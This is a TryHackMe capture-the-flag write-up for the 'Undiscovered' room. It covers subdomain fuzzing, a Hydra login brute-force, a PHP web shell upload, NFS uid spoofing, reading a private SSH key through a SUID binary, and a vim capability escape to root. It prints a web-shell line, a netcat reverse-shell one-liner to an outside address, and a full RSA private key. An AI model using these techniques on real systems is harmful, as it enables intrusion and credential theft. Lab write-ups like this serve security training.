---
title: "Undiscovered TryHackMe Write Up"
last_modified_at: 2020-11-03T14:40:02-05:00
categories:
  - thm
author_profile: false
tags:
  - thm
  - Linux
  - linux capabilities
  - hydra
  - wfuzz
  - nmap
  - SUID
  - vim
  - nfs
  - root squash
  - RiteCMS
  - web
---
![8](/assets/images/thm/undiscovered/8.png)

Undiscovered is a medium rated room by [ch4rm](https://tryhackme.com/p/ch4rm). We find a subdomain which was using a older version of RiteCMS whose login password was bruteforced using hydra to get a reverse shell on the box as www-data. On the box, nfs share was used to get a shell as user william. Afterwards, SUID binary is used to get a shell as another user leonard and at last linux capabilities on a vim binary was exploited to get a shell as root.

> Task 1 \- Capture The Flag
Please allow 5 minutes for this instance to fully deploy before attacking. This vm was developed in collaboration with @H0j3n, thanks to him for the foothold and privilege escalation ideas.  
>      
>Please consider adding undiscovered.thm in /etc/hosts

## Changing the hosts file
```console
10.10.20.167    undiscovered.thm thm
```

# Port Scan
### All Port Scan
```console
localhost@localhost:~/Documents/tryhackme/undiscovered$ nmap -p- --min-rate 10000 10.10.20.167
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-03 09:04 +0545
Nmap scan report for undiscovered.thm (10.10.20.167)
Host is up (0.33s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
43621/tcp open  unknown
```
### Detailed Scan
```console
localhost@localhost:~/Documents/tryhackme/undiscovered$ nmap -sC -sV -p22,80,111,2049,43621 10.10.20.167
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-03 09:06 +0545
Nmap scan report for undiscovered.thm (10.10.20.167)
Host is up (0.36s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
|_  256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
80/tcp    open  http     Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100021  1,3,4      37816/udp6  nlockmgr
|   100021  1,3,4      41870/tcp6  nlockmgr
|   100021  1,3,4      43621/tcp   nlockmgr
|   100021  1,3,4      44763/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs      2-4 (RPC #100003)
43621/tcp open  nlockmgr 1-4 (RPC #100021)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.82 seconds
```
We have quite a few ports open. Few interesting ports are http on port 80 and nfs running on port 2049 which are likely to be more vulnerable then other services. And the tags on the room are web and hydra, there is high possibility that the webserver is likely to be vulnerable. So, lets first enum the nfs service.

### Trying to list the nfs shares
```console
localhost@localhost:~/Documents/tryhackme/undiscovered$ showmount -e 10.10.20.167
clnt_create: RPC: Program not registered
```
I got an error. I searched about the error to know what it meant and did not get that much, so I moved on to port 80.

# Port 80
![1](/assets/images/thm/undiscovered/1.png)

I did some manual recon and checked for common file and did not get that much except index.php.

## Directory Bruteforce
```console
localhost@localhost:~/Documents/tryhackme/undiscovered$ wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404 --hl 9  -c -t 50 http://undiscovered.thm/FUZZ
********************************************************
* Wfuzz 3.0.3 - The Web Fuzzer                         *
********************************************************

Target: http://undiscovered.thm/FUZZ
Total requests: 4614

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                        
===================================================================

000000001:   200        30 L     48 W     355 Ch      "http://undiscovered.thm/"                                                                                     
000002021:   200        30 L     48 W     355 Ch      "index.php"                                                                                                    

Total time: 0
Processed Requests: 4614
Filtered Requests: 4612
Requests/sec.: 0
```
I also tried different wordlists with different extensions but did not get anything.

## Subdomain Bruteforce
```console
localhost@localhost:~/Documents/tryhackme/undiscovered$ wfuzz -w /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-20000.txt --hc 404 --hl 9  -c -t 50 -u 
http://undiscovered.thm -H 'Host: FUZZ.undiscovered.thm'
********************************************************
* Wfuzz 3.0.3 - The Web Fuzzer                         *
********************************************************                               
                                                                                                                                                                                
Target: http://undiscovered.thm/
Total requests: 19983              
                                                                                        
===================================================================                     
ID           Response   Lines    Word     Chars       Payload                                                                                                                   
===================================================================
                                            
000000492:   200        68 L     341 W    4584 Ch     "manager"                                                                                                       
000000517:   200        68 L     341 W    4626 Ch     "dashboard"                                                                                                     
000000523:   200        82 L     341 W    4650 Ch     "deliver"                                                                                                       
000000567:   200        68 L     341 W    4584 Ch     "newsite"                                                                                                       
000000613:   200        68 L     341 W    4584 Ch     "develop"                                                                                                       
000000634:   200        68 L     341 W    4668 Ch     "maintenance"                                                                                                   
000000629:   200        68 L     341 W    4584 Ch     "network"                                                                                                       
000000631:   200        68 L     341 W    4542 Ch     "forms"                                                                                                         
000000666:   200        68 L     341 W    4521 Ch     "view"                                                                                                          
000000681:   200        68 L     341 W    4542 Ch     "start"                                                                                                         
000000679:   200        68 L     341 W    4521 Ch     "play"                                                                                                          
000000675:   200        68 L     341 W    4605 Ch     "mailgate"                                                                                                      
000000697:   200        68 L     341 W    4605 Ch     "internet"                                                                                                      
000000695:   200        68 L     341 W    4521 Ch     "gold"                                                                                                         
000000686:   200        83 L     341 W    4599 Ch     "booking"                                                                                                      
000000692:   200        68 L     341 W    4605 Ch     "terminal"                                                                                                      
000000703:   200        68 L     341 W    4626 Ch     "resources"                                                                                                     
000009543:   400        12 L     53 W     422 Ch      "#www"                                                                                                          
000010595:   400        12 L     53 W     422 Ch      "#mail"                                                                                                         
                                            
Total time: 0                                                                           
Processed Requests: 19983                                                                                                                                                       
Filtered Requests: 19964                                                                                                                                                        
Requests/sec.: 0  
```
We got a bunch of subdomains. Lets add one of the subdomain on our /etc/hosts file.

```console
10.10.20.167    undiscovered.thm thm dashboard.undiscovered.thm
```

### Checking dashboard.undiscovered.thm
![2](/assets/images/thm/undiscovered/2.png)
Looking at the homepage,we can se*e that it is made up with RiteCMS and the version running is **2.2.1**. So, I searched around if there is any publicly available exploit for this versions and I found [this](https://www.exploit-db.com/exploits/48636) article on exploit-db which is an authenticated exploit.

### Exploit
```html
1- Go to following url. >> http://(HOST)/cms/
2- Default username and password is admin:admin. We must know login credentials.
3- Go to "Filemanager" and press "Upload file" button.
4- Choose your php web shell script and upload it. 
     
PHP Web Shell Code == <?php system($_GET['cmd']); ?>

5- You can find uploaded file there. >> http://(HOST)/media/(FILE-NAME).php
6- We can execute a command now. >> http://(HOST)/media/(FILE-NAME).php?cmd=id
```

# Gettting a Shell as www-data
### Checking /cms/
```console
localhost@localhost:~/Documents/tryhackme/undiscovered$ curl http://dashboard.undiscovered.thm/cms/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at dashboard.undiscovered.thm Port 80</address>
</body></html
```
We got a 404 error which is not a good sign. But luckily we do have a quite a few subdomains. So lets check if anyone of those has the path /cms/. But it will take quite a few time to do this, so lets automate this.

### Extracting the subdomains from the wfuzz result
```console
localhost@localhost:~/Documents/tryhackme/undiscovered$ cat subdomain.log  | awk -F\" '{print $2}' | grep -v -e '^$' | tee subdomains
manager
dashboard
deliver
newsite
develop
maintenance
network
forms
view
start
play
mailgate
internet
gold
booking
terminal
resources
#www
#mail
```

### Using wfuzz to search for subdomain with /cms/ present
```console
localhost@localhost:~/Documents/tryhackme/undiscovered$ wfuzz -w subdomains --hc 404 -c -u http://dashboard.undiscovered.thm/cms/ -H 'Host: FUZZ.undiscovered.thm'
********************************************************
* Wfuzz 3.0.3 - The Web Fuzzer                         *
********************************************************

Target: http://dashboard.undiscovered.thm/cms/
Total requests: 19

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                        
===================================================================

000000018:   400        12 L     53 W     422 Ch      "#www"                                                                                                         
000000019:   400        12 L     53 W     422 Ch      "#mail"                                                                                                        
000000003:   200        36 L     80 W     1121 Ch     "deliver"                                                                                                      

Total time: 0
Processed Requests: 19
Filtered Requests: 16
Requests/sec.: 0

```
And we got a 200 response with deliver.undiscovered.thm. So lets add this entry to our hosts file.
```console
10.10.20.167    undiscovered.thm thm dashboard.undiscovered.thm deliver.undiscovered.thm
```
## Visiting deliver.undiscovered.thm
![3](/assets/images/thm/undiscovered/3.png)
And we get a login page this time. Reading the exploit mentioned above, the default creds for RiteCMS is admin:admin. So, I tried to login with that but that did not work. As the room has tag hydra, lets try to bruteforce the login page with user admin.

## Hydra to bruteforce the login password
### Analyzing the request on burp
**Request**
```html
POST /cms/index.php HTTP/1.1
Host: deliver.undiscovered.thm
Content-Length: 27
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://deliver.undiscovered.thm
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://deliver.undiscovered.thm/cms/index.php?msg=login_failed
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ne;q=0.8
Cookie: PHPSESSID=mdvue070t8ntce99nr7d0msqh7
Connection: close

username=admin&userpw=admin
```
**Response**
```html
HTTP/1.1 302 Found
Date: Tue, 03 Nov 2020 03:54:29 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Location: index.php?msg=login_failed
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

### Using hydra
```console
localhost@localhost:~/Documents/tryhackme/undiscovered$ hydra -l admin -P /usr/share/wordlists/SecLists-master/Passwords/darkweb2017-top1000.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=admin&userpw=^PASS^:login_failed"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-03 09:46:13
[DATA] max 16 tasks per 1 server, overall 16 tasks, 999 login tries (l:1/p:999), ~63 tries per task
[DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/index.php:username=admin&userpw=^PASS^:login_failed
[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-03 09:46:29
```

So, we got a valid password ie **liverpool**. So lets login with the obtained creds.

![3](/assets/images/thm/undiscovered/3.png)
And we successfully log in.

### Uploading a new file
![4](/assets/images/thm/undiscovered/4.png)

### Content of shell.php
It is a php-reverse-shell with can be obtained from the github. We only have to change the ip and port on this script.
```php
$ip = '10.6.31.213';  // CHANGE THIS
$port = 9001;       // CHANGE THIS
```

### Uploading the file
![5](/assets/images/thm/undiscovered/5.png)

And the file is uploaded successfully.

### Listening on our box
```console
localhost@localhost:~/Documents/tryhackme/undiscovered$ nc -nvlp 9001
Listening on 0.0.0.0 9001
```
### Using a reverse shell payload
```console
localhost@localhost:~/Documents/tryhackme/undiscovered$ curl http://deliver.undiscovered.thm/media/shell.php 
```
And we got a connection back.
```console
localhost@localhost:~/Documents/tryhackme/undiscovered$ nc -nvlp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.20.167 60744
/bin/sh: 0: can't access tty; job control turned off
$ 
```
## Getting a proper TTY
Now lets get a proper shell with auto completion.

```console
$ python -c "import pty;pty.spawn('/bin/bash')"
```

Hit CRTL+z to background the current process and on local box type

```console
$:~ stty raw -echo
```

and type fg and hit enter twice and on the reverse shell export the TERM as xterm.

```console
www-data@undiscovered:~$ export TERM=xterm
```
### Listing /etc/exports for nfs shares
```console
www-data@undiscovered:/$ cat /etc/exports 
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/home/william   *(rw,root_squash)
```
And we have a **/home/william** share with rw, and root_squash flag enabled. This means we can mount this share on our local machine, create a user with uid of william and write a file on his home directory.

```console
www-data@undiscovered:/$ cat /etc/passwd | grep william
william:x:3003:3003::/home/william:/bin/bash
```

## Mounting /home/william 
```console
localhost@localhost:~/Documents/tryhackme/undiscovered$ mkdir mnt
localhost@localhost:~/Documents/tryhackme/undiscovered$ sudo mount -t nfs 10.10.18.161:/home/william mnt
localhost@localhost:~/Documents/tryhackme/undiscovered$ cd mnt
-bash: cd: mnt: Permission denied
```
But as we try to cd into mnt, we get a permission denied. So lets create a new user william with uid and gid equal to 3003.

### Creating new user
```console
localhost@localhost:~/Documents/tryhackme/undiscovered$ sudo useradd -u 3003  -d /dev/shm william
localhost@localhost:~/Documents/tryhackme/undiscovered$ cat /etc/passwd | grep william
william:x:3003:3003::/dev/shm:/bin/sh
```

### Accessing mnt directory with newly create user
```console
localhost@localhost:~/Documents/tryhackme/undiscovered$ sudo su william
$ bash
william@localhost:/home/localhost/Documents/tryhackme/undiscovered$ cd mnt
william@localhost:/home/localhost/Documents/tryhackme/undiscovered/mnt$ ls
admin.sh  script  user.txt
```
Now, we can read the user.txt flag.

### Reading user.txt
```console
william@localhost:/home/localhost/Documents/tryhackme/undiscovered/mnt$ cat user.txt 
THM{8d7************************0e091c}
```
### Getting a shell as william
```console
localhost@localhost:~/Documents/tryhackme/undiscovered$ ssh-keygen -f william
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in william
Your public key has been saved in william.pub
The key fingerprint is:
SHA256:1ril+b+qFrnca6CbyVRH9cxhrdG5Yq6fpfp7qZ3n1fU localhost@localhost
The key's randomart image is:
+---[RSA 3072]----+
|            . oo.|
|           . =.oo|
|          .   +o.|
|         +   o.. |
|        S.+ o . .|
|       o+*   .  +|
|      .o+=  .  .E|
|     o.o+.o.  =o+|
|      =o.o+=*O++o|
+----[SHA256]-----+
```
### Writing our public key to william's home directory
```console
william@localhost:/home/localhost/Documents/tryhackme/undiscovered/mnt$ mkdir .ssh
william@localhost:/home/localhost/Documents/tryhackme/undiscovered/mnt$ cat ../william.pub > .ssh/authorized_keys
```

### Using ssh to log in as william
```console
localhost@localhost:~/Documents/tryhackme/undiscovered$ chmod 600 william
localhost@localhost:~/Documents/tryhackme/undiscovered$ ssh -i william william@10.10.18.161
The authenticity of host '10.10.18.161 (10.10.18.161)' can't be established.
ECDSA key fingerprint is SHA256:4FZwE+zBYXSpNWyxNclsv843P0McfDHD9nPMOH26bek.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.18.161' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


0 packages can be updated.
0 updates are security updates.


Last login: Thu Sep 10 00:35:09 2020 from 192.168.0.147
william@undiscovered:~$
```
And we get in.

### Shell as leonard
```console
william@undiscovered:~$ ls -la
total 48
drwxr-x--- 5 william william 4096 Nov  3 12:35 .
drwxr-xr-x 4 root    root    4096 Sep  4 22:56 ..
-rwxr-xr-x 1 root    root     128 Sep  4 21:43 admin.sh
-rw------- 1 root    root       0 Sep  9 21:46 .bash_history
-rw-r--r-- 1 william william 3771 Sep  4 22:16 .bashrc
drwx------ 2 william william 4096 Sep  4 18:33 .cache
drwxrwxr-x 2 william william 4096 Sep  4 21:49 .nano
-rw-r--r-- 1 william william   43 Sep  4 22:19 .profile
-rwsrwsr-x 1 leonard leonard 8776 Sep  4 22:11 script
drwxrwxr-x 2 william william 4096 Nov  3 12:35 .ssh
-rw-r----- 1 root    william   38 Sep 10 00:36 user.txt
```
One interesting file on the home directory of william is **script** which has a suid bit set of user leonard which means that when the executable script is run, it runs as user leonard. I donwloaded this binary and analysed on ghidra which I am not going to show here because it is pretty easy binary.
If the binary is run without argument, it will execute admin.sh with privileges of user william and if there is a argument it will try to run command `/bin/cat /home/leonard/<argument>`.

### Without argument
```console
william@undiscovered:~$ cat admin.sh 
#!/bin/sh

    echo "[i] Start Admin Area!"
    echo "[i] Make sure to keep this script safe from anyone else!"
    
    exit 0
william@undiscovered:~$ ./script 
[i] Start Admin Area!
[i] Make sure to keep this script safe from anyone else!
```

### With a argument
```console
william@undiscovered:~$ ./script test
/bin/cat: /home/leonard/test: No such file or directory
```
Okay, this means we can read any file that is owned by user leonard. But it would be so nice, if we could read his private key if present, no?

```console
william@undiscovered:~$ ./script .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df
YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn
SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih
hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL
+ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN
C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt
+1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i
72C1iphGoLMaHVq6Lh/S4L7COSpPVU5LnB7CJ56RmZMAKRORxuFw3W9B8SyV6UGg
Jb1l9ksAmGvdBJGzWgeFFj82iIKZkrx5Ml4ZDBaS39pQ1tWfx1wZYwWw4rXdq+xJ
xnBOG2SKDDQYn6K6egW2+aNWDRGPq9P17vt4rqBn1ffCLtrIN47q3fM72H0CRUJI
Ktn7E2ECgYEA3fiVs9JEivsHmFdn7sO4eBHe86M7XTKgSmdLNBAaap03SKCdYXWD
BUOyFFQnMhCe2BgmcQU0zXnpiMKZUxF+yuSnojIAODKop17oSCMFWGXHrVp+UObm
L99h5SIB2+a8SX/5VIV2uJ0GQvquLpplSLd70eVBsM06bm1GXlS+oh8CgYEA3cWc
TIJENYmyRqpz3N1dlu3tW6zAK7zFzhTzjHDnrrncIb/6atk0xkwMAE0vAWeZCKc2
ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ
iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg
zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK
3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk
OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8
jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld
sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+
cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa
bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
-----END RSA PRIVATE KEY-----
```
Now that we have his private key, lets try to login as user leonard.

### Shell as leonard
```console
william@undiscovered:~$ ./script .ssh/id_rsa > leonard
william@undiscovered:~$ chmod 600 leonard 
william@undiscovered:~$ ssh -i leonard leonard@undiscovered 
The authenticity of host 'undiscovered (127.0.1.1)' can't be established.
ECDSA key fingerprint is SHA256:4FZwE+zBYXSpNWyxNclsv843P0McfDHD9nPMOH26bek.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'undiscovered' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


0 packages can be updated.
0 updates are security updates.


Last login: Fri Sep  4 22:57:43 2020 from 192.168.68.129
leonard@undiscovered:~$ 
```
### Listing the contents of home directory
```console
leonard@undiscovered:~$ ls -la
total 36
drwxr-x--- 5 leonard leonard 4096 Sep  9 21:45 .
drwxr-xr-x 4 root    root    4096 Sep  4 22:56 ..
-rw------- 1 root    root       0 Sep  9 21:45 .bash_history
-rw-r--r-- 1 leonard leonard 3771 Sep  4 22:16 .bashrc
drwx------ 2 leonard leonard 4096 Sep  4 18:14 .cache
drwxrwxr-x 2 leonard leonard 4096 Sep  4 21:35 .nano
-rw-r--r-- 1 leonard leonard   43 Sep  4 22:45 .profile
drwx------ 2 leonard leonard 4096 Sep  4 22:43 .ssh
-rw------- 1 leonard leonard 6132 Sep  4 22:49 .viminfo
```
**\.viminfo** seems to contain some information.

### Contents of .viminfo
```console
# File marks:
'0  3  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
'1  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
'2  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
'3  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")

# Jumplist (newest first):
-'  3  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
```
I found this interesting as the user leonard has tried to get a reverse shell as root using vim. So, I checked if the vim has SUID bit set or has any special capabilites.

### Checking for SUID binaries
```console
leonard@undiscovered:~$ find / -type f -name "*vi*" -perm -4000 -ls 2>/dev/null
   390706     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
```
I got nothing.

### Checking for linux capabilities
```console
leonard@undiscovered:~$ getcap -r / 2>/dev/null
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_setuid+ep
```
And turns out vim.basic has a setuid capabilities which means when the vim.basic runs, it runs with root privileges.
So I checked on gtfobins the way to exploit this and got the following exploit.
![7](/assets/images/thm/undiscovered/7.png)

### Getting a root shell
```console
leonard@undiscovered:~$ /usr/bin/vim.basic -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
Error detected while processing command line:
E319: Sorry, the command is not available in this version: :py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
Press ENTER or type command to continue
```
We get a error. So, lets try with py3.
```console
leonard@undiscovered:~$ /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
# id
uid=0(root) gid=1002(leonard) groups=1002(leonard),3004(developer)
```
And we are now root. 

### Reading the root hash
```console
# cat /etc/shadow | grep -i root
root:$6$1V*************729XRbQB7u3rndC.8wl****************w2QVsVxHSH.ghR******************CfY6iv/koGQQPUB0:18508:0:99999:7:::
```



